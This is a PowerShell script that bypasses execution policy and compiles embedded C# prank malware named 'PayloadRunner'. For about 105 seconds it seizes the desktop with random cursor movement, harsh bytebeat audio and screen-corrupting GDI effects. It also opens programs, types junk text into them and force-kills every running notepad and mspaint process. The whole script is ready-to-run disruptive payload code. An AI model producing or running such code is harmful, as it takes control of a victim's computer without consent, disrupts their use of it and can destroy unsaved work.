Set-ExecutionPolicy Bypass -Scope Process -Force

$randId = Get-Random -Minimum 10000 -Maximum 99999
$namespaceName = "MemeChatChaos_$randId"

$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace $namespaceName {
    public class PayloadRunner {
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")] public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        [DllImport("user32.dll")] public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")] public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEHDR {
            public IntPtr lpData; public uint dwBufferLength; public uint dwBytesRecorded;
            public IntPtr dwUser; public uint dwFlags; public uint dwLoops; public IntPtr lpNext; public IntPtr reserved;
        }

        [DllImport("winmm.dll")] public static extern int waveOutOpen(out IntPtr hWaveOut, uint uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] public static extern int waveOutPrepareHeader(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);
        [DllImport("winmm.dll")] public static extern int waveOutWrite(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);

        const uint SRCINVERT = 0x00660046;
        const uint SRCCOPY   = 0x00CC0220;
        const uint SRCPAINT  = 0x00EE0086;
        const uint PATINVERT = 0x005A0049;
        const uint DSTINVERT = 0x00550009;
        const uint NOTSRCOPY = 0x00330008;
        const uint SRCAND    = 0x008800C6;

        public static int currentPayload = 1;
        public static bool isRunning = true;

        public static void AudioThread() {
            IntPtr hWaveOut;
            WAVEFORMATEX wfx = new WAVEFORMATEX();
            wfx.wFormatTag = 1; wfx.nChannels = 1; wfx.nSamplesPerSec = 8000;
            wfx.nAvgBytesPerSec = 8000; wfx.nBlockAlign = 1; wfx.wBitsPerSample = 8; wfx.cbSize = 0;

            if (waveOutOpen(out hWaveOut, 0xFFFFFFFF, ref wfx, IntPtr.Zero, IntPtr.Zero, 0) != 0) return;

            int bufferSize = 8000;
            byte[] buffer = new byte[bufferSize];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);

            WAVEHDR header = new WAVEHDR();
            header.lpData = handle.AddrOfPinnedObject();
            header.dwBufferLength = (uint)bufferSize;

            int t = 0;
            while (isRunning) {
                for (int i = 0; i < bufferSize; i++) {
                    byte b = 0;
                    // 7 уникальных bytebeat в стиле pankoza
                    switch (currentPayload) {
                        case 1: b = (byte)((t * (t >> 5 | t >> 8) ^ (t >> 16)) * 42); break;
                        case 2: b = (byte)((t * 5 & t >> 7) | (t * 3 & t >> 10) | (t * 9 & t >> 4)); break;
                        case 3: b = (byte)((t * (t >> 3 | t >> 9) & (t >> 4)) ^ (t * (t >> 6 | t >> 12))); break;
                        case 4: b = (byte)((t * ((t >> 9 | t >> 13) % 11)) ^ (t >> 2 | t >> 8)); break;
                        case 5: b = (byte)(t * ((t >> 12 | t >> 8) & 63 & t >> 4)); break;
                        case 6: b = (byte)((t >> 6 ^ t >> 8 | t >> 12) * 10 + (t >> 4 & 15)); break;
                        case 7: b = (byte)((t * 3 & t >> 3 | t * 5 & t >> 4 | t * 7 & t >> 5) + 128); break;
                    }
                    buffer[i] = b;
                    t++;
                }
                waveOutPrepareHeader(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                waveOutWrite(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                Thread.Sleep(950);
            }
        }

        public static void Run() {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            Random r = new Random();

            Thread aThread = new Thread(AudioThread);
            aThread.IsBackground = true;
            aThread.Start();

            DateTime start = DateTime.Now;
            int appTimer = 0;

            // Воссоздаем картинку-аватарку (Русский чат с мемным лицом) в виде квадрата
            Bitmap memeLogo = new Bitmap(140, 140);
            using (Graphics g = Graphics.FromImage(memeLogo)) {
                g.Clear(Color.FromArgb(50, 170, 240)); // Голубой фон чата
                using (Brush bWhite = new SolidBrush(Color.White), bBlack = new SolidBrush(Color.Black)) {
                    g.FillEllipse(bWhite, 20, 20, 100, 100); // Бабл лица
                    g.FillRectangle(bBlack, 45, 55, 18, 8);  // Глаза
                    g.FillRectangle(bBlack, 75, 55, 18, 8);
                    // Улыбка / хвост чата
                    using (Pen pBlack = new Pen(Color.Black, 4)) {
                        g.DrawArc(pBlack, 45, 75, 45, 25, 0, 180);
                    }
                }
            }

            while (isRunning) {
                if ((GetAsyncKeyState(0x1B) & 0x8000) != 0) break;

                IntPtr hdc = GetDC(IntPtr.Zero);
                int elapsed = (int)(DateTime.Now - start).TotalSeconds;

                if (elapsed >= 105) {
                    isRunning = false;
                    break;
                }

                currentPayload = (elapsed / 15) + 1;

                // 1. Бешеное движение курсора
                SetCursorPos(r.Next(0, w), r.Next(0, h));

                // 2. Открытие разных приложений и ввод чуши
                appTimer++;
                if (appTimer % 140 == 0) {
                    try {
                        string[] apps = { "notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe" };
                        Process.Start(apps[r.Next(apps.Length)]);
                        Thread.Sleep(250);
                        SendKeys.SendWait("RUSSIAN CHAT RP PANKOZA KSDCBRCTYS 777 ERROR TRASH CODE! " + r.Next(100, 999) + "{ENTER}");
                    } catch {}
                }
                if (appTimer % 300 == 0) {
                    try {
                        foreach (var proc in Process.GetProcessesByName("notepad")) { proc.Kill(); }
                        foreach (var proc in Process.GetProcessesByName("mspaint")) { proc.Kill(); }
                    } catch {}
                }

                // 3. Движение картинкой как куб (плоское перемещение по экрану)
                using (Graphics gScreen = Graphics.FromHdc(hdc)) {
                    int cubeX = (int)(Math.Cos(elapsed * 4) * 300 + (w / 2) - 70);
                    int cubeY = (int)(Math.Sin(elapsed * 6) * 200 + (h / 2) - 70);
                    gScreen.DrawImage(memeLogo, cubeX, cubeY);
                }

                // 7 разных GDI эффектов по 15 секунд
                switch (currentPayload) {
                    case 1:
                        BitBlt(hdc, r.Next(-30, 31), r.Next(-30, 31), w, h, hdc, 0, 0, SRCINVERT);
                        break;
                    case 2:
                        for (int i = 0; i < 20; i++) {
                            int bx = r.Next(0, w - 120);
                            int by = r.Next(0, h - 120);
                            BitBlt(hdc, bx + r.Next(-20, 21), by + r.Next(-20, 21), 120, 120, hdc, bx, by, SRCCOPY);
                        }
                        break;
                    case 3:
                        for (int y = 0; y < h; y += 20) {
                            int shift = (int)(Math.Sin(y * 0.08 + elapsed * 12) * 70);
                            BitBlt(hdc, shift, y, w, 20, hdc, 0, y, SRCPAINT);
                        }
                        break;
                    case 4:
                        PatBlt(hdc, 0, 0, w, h, PATINVERT);
                        StretchBlt(hdc, 25, 25, w - 50, h - 50, hdc, 0, 0, w, h, SRCCOPY);
                        break;
                    case 5:
                        for (int x = 0; x < w; x += 25) {
                            BitBlt(hdc, x, r.Next(-40, 41), 25, h, hdc, x, 0, NOTSRCOPY);
                        }
                        break;
                    case 6:
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32513));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32516));
                        StretchBlt(hdc, -30, -30, w + 60, h + 60, hdc, 0, 0, w, h, SRCAND);
                        break;
                    case 7:
                        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCOPY);
                        if (r.Next(0, 2) == 0) PatBlt(hdc, 0, 0, w, h, DSTINVERT);
                        break;
                }

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }

            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }
    }
}
"@

$compiled = Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -PassThru
$runner = $compiled | Where-Object { $_.Name -eq "PayloadRunner" }
$runner::Run()